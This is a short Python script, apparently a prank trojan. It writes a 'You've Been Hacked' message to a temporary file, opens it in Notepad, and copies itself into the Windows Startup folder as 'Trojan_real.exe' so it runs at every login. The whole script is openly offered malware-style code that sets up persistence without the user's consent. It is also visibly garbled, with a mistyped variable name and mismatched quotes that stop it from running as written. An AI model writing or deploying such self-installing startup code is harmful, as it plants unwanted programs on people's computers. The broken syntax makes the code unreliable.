import os
import subprocess
import tempfile

# The Messsage
message = "You've Been Hacked Muahahahahahahaaa"

# Create a tempory text file with the Message
temp_dlr = tempfile.gettempdir()
message_file = os.path.join(temp_dir, "message.txt")

with open(message_file, "w") as file:
    file.write(message)
# Open the temporary text file in Notepad
subprocess.Popen(["notepad.exe", message_file])

import os
import shutil
from pathlib import Path

# Define the script's current path and its target in the Startup folder
current_file_path = os.path.abspath(__file__)
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft, "Windows", "Start Menu", "Programs", "Startup")
startup_file_path = os.path.join(startup_folder, "Trojan_real.exe")

# Copy the script to the Startup folder for persistence
if not os.path.exists(startup_file_path):
    shutil.copy2(current_file_path, startup_file_path)
    print(f"Trojan_real.exe" has been added to the Startup folder at {startup_file_path}")
else:
    print("Trojan_real.exe is already in the Startup folder.")